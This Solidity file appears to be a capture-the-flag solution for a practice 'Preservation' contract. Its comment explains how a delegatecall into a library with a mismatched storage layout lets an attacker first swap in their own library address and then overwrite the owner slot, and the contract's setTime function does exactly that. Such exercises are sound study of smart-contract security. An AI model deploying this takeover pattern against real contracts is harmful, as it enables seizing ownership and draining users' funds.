// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract PreservationAttack {

 /**
  The Preservation contract will run LibraryContract's code by using delegateCall, which brings one weakness that when executing LibraryContract's code will 
  changed the Preservation's corrospending's slot value. 
  The first slot value of Preservation contract is address public timeZone1Library;
  The first slot value of LibraryContract is uint storedTime;  
  So when calling LibraryContract's setTime function, actually changed the timeZone1Library value, though seems will change the uint storedTime;.

  Based on above weakness, can conduct below attack steps:
  1: Change `address public timeZone1Library` in Preservation contract to the attacker address based on the above.
  2: Beacuse the value is uint, should covert this address into uint
  3: Calling the setFirstTime of the Preservation contract, which actually call this PreservationAttack's setTime function, as this PreservationAttack storage layout as bleow:
        address public timeZone1Library;
        address public timeZone2Library;
        address public owner; 
    So this operation leads to changing the third slot value of the Preservation contract, which store the Preservation contract's owner.
  4. Still as step2, should convert the uint to the attacker address.
 */

  
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function setTime(uint _time) public {
    owner = address(uint160(_time));
  }
    
}
